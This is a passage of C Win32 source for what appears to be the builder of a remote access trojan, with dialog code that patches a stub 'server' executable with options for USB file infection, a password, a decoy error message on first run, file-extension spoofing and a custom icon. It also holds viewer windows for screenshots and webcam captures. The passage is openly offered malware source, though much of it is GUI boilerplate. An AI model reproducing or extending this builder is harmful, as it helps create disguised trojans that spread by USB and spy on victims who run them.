            SetFilePointer(hFile, BYTE_OFFSET_INFPLUS , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, InfectUSBFiles, sizeof("INFECTALLUSBFILE_OFF"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
            }

            if(IsDlgButtonChecked(hwndEDlg, IDC_PASSWORD) == BST_CHECKED)
            {

             if(strlen(passkey)>12)
             {
                 MessageBox(hwndEDlg,"Password can not be morethan 12 characters","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
             }

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_SETPASS , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, SetSecurityPass, sizeof("SECURITYPASS_OFF"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PASSKEY , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, passkey, sizeof("xPxAxSxSxKxExYx"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
            }


            if(IsDlgButtonChecked(hwndEDlg, IDC_ERROR_MSG) == BST_CHECKED)
            {

             if(strlen(errmsg)>60)
             {
                 MessageBox(hwndEDlg,"Error message can not be morethan 60 characters","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
             }



             if(strlen(errtitle)>23)
             {
                 MessageBox(hwndEDlg,"Error title can not be morethan 20 characters","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
             }


            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_SHOWERR , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, Show1stModErr, sizeof("SHO1STMODERR_OFF"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_ERRMSG , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile,  errmsg, sizeof("ERRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRORRRRRRRRRRRRRRRRRRRRRRRR"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_ERRTTLE , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile,  errtitle, sizeof("ERRTITLEXXXXXXXXXXXXXX"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
            }
            //ret=0;
            //SetFilePointer(hFile, 1727 /*BYTE_OFFSET_PROC*/, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            //WriteFile(hFile, "127.0.0.1"/*Process*/, sizeof("192.168.0.2"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            CloseHandle(hFile);

            AddIcon(szIcoFileName,Name);

            MessageBox(NULL, "Server generated succesfully.", "Done", MB_OK|MB_ICONINFORMATION);
            EndDialog(hwndEDlg,0);


        }
        break;


        case IDC_NEXT:
        {


        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBNAME ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_IP ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_NEXT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_MAINPORT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC1 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC3 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC4 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC5 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC6 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC7 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC8 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC9 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC10 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC11 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASSWORD ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC14 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SOCKINFO ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_AUTOSOCK_GEN ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_MANSOCK_GEN ),SW_HIDE);

        ShowWindow(GetDlgItem(hwndEDlg, IDC_BACK ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC2 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INF ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INFPLUS ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ICOSTATIC ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBIMG ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ADDICON ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BUILD ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC12 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC13 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SPOOF ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC15 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_MSG ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONERR ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE ),SW_SHOW);


        }
        break;



        case IDC_BACK:
        {

        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBNAME ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_IP ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_NEXT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_MAINPORT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC1 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC3 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC4 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC5 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC6 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC7 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC8 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC9 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC10 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC11 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASSWORD ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC14 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SOCKINFO ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_AUTOSOCK_GEN ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_MANSOCK_GEN ),SW_SHOW);

        ShowWindow(GetDlgItem(hwndEDlg, IDC_BACK ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INFPLUS ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ICOSTATIC ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBIMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ADDICON ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BUILD ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC12 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC13 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SPOOF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC15 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_MSG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONERR ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE ),SW_HIDE);

        }
        break;


        case IDC_BROWSE_IMG:
        {
            OPENFILENAME ofn;
            memset(&ofn, 0, sizeof(ofn));
            szIcoFileName[0] = '\0';
            ofn.lStructSize = sizeof(OPENFILENAME);
            ofn.hwndOwner = hwndEDlg;
            ofn.lpstrFilter = "Icon Files (*.ico)\0*.ico\0\0";
            ofn.lpstrFile = szIcoFileName;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_PATHMUSTEXIST;
            if(GetOpenFileName(&ofn))
            {
                SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_STUBIMG), szIcoFileName);
            }
        }
        break;

        case IDC_ERROR_TEST:
        {
          GetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), errmsg, 70);
          GetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), errtitle, 25);
          MessageBox(hwndEDlg,errmsg,errtitle,MB_OK|MB_ICONERROR);
        }
        break;

        case IDC_ADDICON:
        {
            if(IsDlgButtonChecked(hwndEDlg, IDC_ADDICON) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG), TRUE);
            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG), FALSE);
            }

        }
        break;


        case IDC_INF:
        {
          //SendDlgItemMessage(hwndEDlg,IDC_INFPLUS,BM_SETCHECK,0,0);
        }
        break;


        case IDC_INFPLUS:
        {
          //SendDlgItemMessage(hwndEDlg,IDC_INF,BM_SETCHECK,0,0);
        }
        break;

        case IDC_SPOOF:
        {
            if(IsDlgButtonChecked(hwndEDlg, IDC_SPOOF) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF), TRUE);
            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF), FALSE);
            }
        }
        break;

        case IDC_ERROR_MSG:
        {
            if(IsDlgButtonChecked(hwndEDlg, IDC_ERROR_MSG) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), TRUE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST), TRUE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), TRUE);

                SetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), "Message");
                SetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), "Title");

            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), FALSE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST), FALSE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), FALSE);
            }
        }
        break;


        case IDC_AUTOSOCK_GEN:
        {
            if(IsDlgButtonChecked(hwndEDlg, IDC_AUTOSOCK_GEN) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS), FALSE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), FALSE);
            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS), TRUE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), TRUE);
            }


        }
        break;



        case IDC_MANSOCK_GEN:
        {
            if(IsDlgButtonChecked(hwndEDlg,IDC_MANSOCK_GEN) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS), TRUE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), TRUE);
            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS), FALSE);
                EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), FALSE);
            }


        }
        break;





        case IDC_PASSWORD:
        {
            if(IsDlgButtonChecked(hwndEDlg, IDC_PASSWORD) == BST_CHECKED)
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT), TRUE);
            }

            else
            {
                EnableWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT), FALSE);
            }
        }
        break;



        case IDCANCEL:
            EndDialog(hwndEDlg,Select);
            break;
        }



   /* case WM_PAINT:
    {

        BITMAP bm;
        PAINTSTRUCT ps;

        HDC hdc = BeginPaint(hwndEDlg, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,g_hbmAbt);

        GetObject(g_hbmAbt, sizeof(bm), &bm);

        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);


        //RestoreDC(hdcMem);
        DeleteDC(hdc);
        //DeleteObject(g_hbmScrSht);
        //DeleteObject(hbmOld);

        EndPaint(hwndEDlg, &ps);


    }
    break;*/

    // case WM_CTLCOLORDLG:
    // return (LONG)g_hbrBackground;


////////////////////////////////////////////////////////////////////////////////
    default:
        return FALSE;
    }
    return TRUE;
}



DWORD WINAPI Draw(LPVOID lParam)
{

    mystruct * MS = (mystruct *)lParam;
    RECT rc;
//    LVBKIMAGE IBBkImg;
    HBITMAP Final = MS ->Screen;
    HDC hdcBackground;
    INT ndcBackground;
    HDC hdc = 0;
    HDC hdcScreen;

    PAINTSTRUCT ps;
    HBITMAP hbmMem;
    INT ndcMem;
    HDC hdcMem;

    int ID3 = MS->ID3;
    int ID4 = MS->ID4;
    int ID = MS->ID;
    //ID = (int)lParam;
    if(hwndScrSht == NULL)
    {
        return 1;
    }
    GetClientRect(hwndScrSht, (LPRECT) &rc);
    if(Final == NULL) return -1;
    hdcScreen = GetDC(HWND_DESKTOP);
    hdcBackground = CreateCompatibleDC(hdcScreen);
    ndcBackground = SaveDC(hdcBackground);
    SelectObject(hdcBackground, Final);
    ReleaseDC(HWND_DESKTOP, hdcScreen);
    if(hwndScrSht == NULL)
    {
        return 1;
    }
    if(hwndScrSht == NULL)
    {
        return 1;
    }
    UpdateWindow (hwndScrSht);


    if(hwndScrSht == NULL)
    {
        return 1;
    }
    if(BeginPaint(hwndScrSht, &ps))
    {

        if(hwndScrSht == NULL)
        {
            return 1;
        }
        // Create int buffer
        hdcMem = CreateCompatibleDC(ps.hdc);
        ndcMem = SaveDC(hdcMem);
        hbmMem = CreateCompatibleBitmap(ps.hdc, ID3, ID4);
        SelectObject(hdcMem, hbmMem);
        if(hwndScrSht == NULL)
        {
            return 1;
        }
        // Copy background bitmap into int buffer
        if(BitBlt(hdcMem, 0, 0, ID3, ID4, hdcBackground, 0, 0, SRCCOPY) == NULL)
        {
            //MessageBox(NULL, "failed", "FAILED", MB_OK);
        }
        //StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
        //Copy int buffer to screen
        if(BitBlt(ps.hdc, 0, 0, ID3, ID4, hdcMem, 0, 0, SRCCOPY) == NULL)
        {
            //	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
        }
        if(hwndScrSht == NULL)
        {
            return 1;
        }
        // Clean up
        RestoreDC(hdcMem, ndcMem);
        DeleteObject(hbmMem);
        DeleteObject(Final);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        DeleteDC(hdc);
        EndPaint(hwndScrSht, &ps);

    }
    return 0;
}









LRESULT CALLBACK About_Dlg_Proc(HWND hwndADlg, UINT message, WPARAM wParam, LPARAM lParam)
{
  //HANDLE g_hLink =  GetDlgItem(hwndADlg,IDC_SYSLINK1);
  POINT pt;
	RECT rect;
	RECT rect2;
	HICON hAIcon;
	HBITMAP hABitmap;

    switch(message)
    {

    /*case WM_NCHITTEST:
    {
        LRESULT hit = DefWindowProc(hwndADlg, message, wParam, lParam);

        if(hit == HTCLIENT)
        hit = HTCAPTION;
        return hit;
        //return HTCAPTION;
    }
    break;*/



    case WM_INITDIALOG:
    {
        InitCommonControls();
        g_hbmAbt = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ABT));


        hAIcon = (HICON)LoadImage(AInst, MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 15, 15, 0);
		SendMessage(GetDlgItem(hwndADlg, IDC_FBLINK), STM_SETIMAGE, (WPARAM)hAIcon, (LPARAM)0);

       /* hAIcon = LoadIcon(AInst, MAKEINTRESOURCE(IDI_CANCELABT));//(HICON)LoadImage(AInst, MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 30, 30, 0);
		SendMessage(GetDlgItem(hwndADlg, IDC_CANCELABT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);*/

        hAIcon = (HICON)LoadImage(AInst, MAKEINTRESOURCE(IDI_FACEBOOK), IMAGE_ICON, 15, 15, 0);
		SendMessage(GetDlgItem(hwndADlg, IDC_FBLINK), STM_SETIMAGE, (WPARAM)hAIcon, (LPARAM)0);

        hABitmap = (HBITMAP)LoadImage(AInst, MAKEINTRESOURCE(IDB_TWITTER), IMAGE_BITMAP, 16, 16, 0);
		SendMessage(GetDlgItem(hwndADlg, IDC_TWEETLINK), STM_SETIMAGE, (WPARAM)hABitmap, (LPARAM)0);

		//SendMessage(GetDlgItem(hwndADlg, IDC_CANCELABT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		//SendMessage(hwndADlg, WM_SETICON, IDC_CANCELABT, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT)));

    }
    return TRUE;

    case WM_COMMAND:
    {

        switch(LOWORD(lParam))
        {

        }
    }
    return TRUE;

    case WM_NOTIFY:
    {
        switch (((LPNMHDR)lParam)->code)
        {
        case NM_DBLCLK:
        {
            EndDialog(hwndADlg,0);
        }
        break;

        case NM_CLICK://NM_RETURN:
        {
           // PNMLINK pNMLINK = (pNMLINK),lParam;
           // LITEM item = pNMLINK->item;

           // lstrcpy(item.szUrl,"http:\\www.lethalware.net");

            //if ((((LPNMHDR)lParam)->hwndFrom == g_hLink)&&(item.iLink==0))
            if(wParam==IDC_SYSLINK1)
            {

                ShellExecute(NULL,"open","http:\\localhost\\project_intifada",NULL,NULL,SW_SHOWNORMAL);

            }

            if(wParam==IDC_SYSLINK2)
            {

             ShellExecute(NULL,"open","http:\\facebook.com\\lethalskills",NULL,NULL,SW_SHOWNORMAL);

            }

            if(wParam==IDC_SYSLINK3)
            {

               ShellExecute(NULL,"open","http:\\",NULL,NULL,SW_SHOWNORMAL);

            }


        }
        }
    }
    return TRUE;

    case WM_CLOSE:
    {

        EndDialog(hwndADlg,0);
        DeleteObject(g_hbmAbt);
        //DeleteObject(hAIcon);
    }
    return TRUE;

    case WM_PAINT:
    {

        //SendMessage(GetDlgItem(hwndADlg, IDC_CANCELABT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

        BITMAP bm;
        PAINTSTRUCT ps;

        HDC hdc = BeginPaint(hwndADlg, &ps);


        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,g_hbmAbt);

        GetObject(g_hbmAbt, sizeof(bm), &bm);

        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);

        //RestoreDC(hdcMem);
        DeleteDC(hdc);
        //DeleteObject(g_hbmScrSht);
        //DeleteObject(hbmOld);

        EndPaint(hwndADlg, &ps);

    }
    return TRUE;


	case WM_MOUSEMOVE:
	{

		GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_CANCELABT), &rect);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_FBLINK), &rect2);

		if(PtInRect(&rect, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
		}

		if(PtInRect(&rect2, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
            hAIcon = (HICON)LoadImage(AInst, MAKEINTRESOURCE(IDI_FACEBOOK), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndADlg, IDC_FBLINK), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}

		else
		{
			SetCursor(LoadCursor(NULL, IDC_ARROW));
            hAIcon = (HICON)LoadImage(AInst, MAKEINTRESOURCE(IDI_FACEBOOK), IMAGE_ICON, 15, 15, 0);
            SendMessage(GetDlgItem(hwndADlg, IDC_FBLINK), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

		}


	}
    break;


	case WM_LBUTTONDOWN:
	{

		GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_CANCELABT), &rect);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_FBLINK), &rect2);

		if(PtInRect(&rect, pt))
		{
		    EndDialog(hwndADlg,0);
		}

		if(PtInRect(&rect2, pt))
		{
		   ShellExecute(NULL,"open","http:\\facebook.com\\lethalskills",NULL,NULL,SW_SHOWNORMAL);
		}

		else
		{
		    SendMessage(hwndADlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		}



	}
    break;

	case WM_RBUTTONDOWN:
		GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_CANCELABT), &rect);
		GetWindowRect(GetDlgItem(hwndADlg, IDC_FBLINK), &rect2);

		if(PtInRect(&rect, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
		}



        if(PtInRect(&rect2, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
		}
		break;



    /*case WM_CTLCOLORDLG:
        return (LONG)g_hbrBackground;
    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LONG)g_hbrBackground;
    }
    break;*/



    }
    return FALSE;
}


/*DWORD WINAPI AboutWindow(LPVOID lpParam)
{

    hwndabt = CreateDialog(AInst,(LPCTSTR)About_Dlg,NULL,(DLGPROC)About_Dlg_Proc);
    ShowWindow(hwndabt,SW_SHOW);

    SendMessage(hwndabt, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndabt, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndabt,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}*/




BOOL CALLBACK WEBSHT_DlgProc(HWND hwndwDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{


    RECT rc;    // client area
    HBITMAP Final;
    HDC hdcBackground;
    INT ndcBackground;
    HDC hdc = 0;
    HDC hdcScreen;

    PAINTSTRUCT ps;
    HBITMAP hbmMem;
    INT ndcMem;
    HDC hdcMem;

    POINT pt;
    RECT  rect,rect2;
    HICON hAicon;

    switch(uMsg)
    {

    case WM_INITDIALOG:
    {
        /*hStatus6 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndwDlg,
                                  (HMENU) IDC_WEBSHT_STATUS,
                                  GetModuleHandle(NULL), NULL);*/
//g_hbmBall = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BALL));

        DestroyCaption(hwndwDlg);

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
        SendMessage(GetDlgItem(hwndwDlg, IDC_SAVE_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
	    	SendMessage(GetDlgItem(hwndwDlg, IDC_EXT_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

    }
    return TRUE;






    case WM_LBUTTONDOWN:
      {
		    GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hwndwDlg, IDC_SAVE_CAM), &rect);
		    GetWindowRect(GetDlgItem(hwndwDlg, IDC_EXT_CAM), &rect2);

	     	if(PtInRect(&rect, pt))
		   {


		    break;
		   }


	     	if(PtInRect(&rect2, pt))
		   {
		    EndDialog(hwndwDlg,0);
		    break;
		   }


		   else
		   {
		    SendMessage(hwndwDlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		   }

    }
    return TRUE;




case WM_MOUSEMOVE:
    {
        GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hwndwDlg, IDC_SAVE_CAM), &rect);
		    GetWindowRect(GetDlgItem(hwndwDlg, IDC_EXT_CAM), &rect2);


		if(PtInRect(&rect, pt))
		{
		  	SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndwDlg, IDC_SAVE_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

		    break;

		}


		if(PtInRect(&rect2, pt))
		{
		  	SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndwDlg, IDC_EXT_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

		    break;

		}

		else
		{
      hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
      SendMessage(GetDlgItem(hwndwDlg, IDC_SAVE_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

      hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
	  	SendMessage(GetDlgItem(hwndwDlg, IDC_EXT_CAM), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);
		}

    }
    return TRUE;



    case WM_COMMAND:
    {

    }
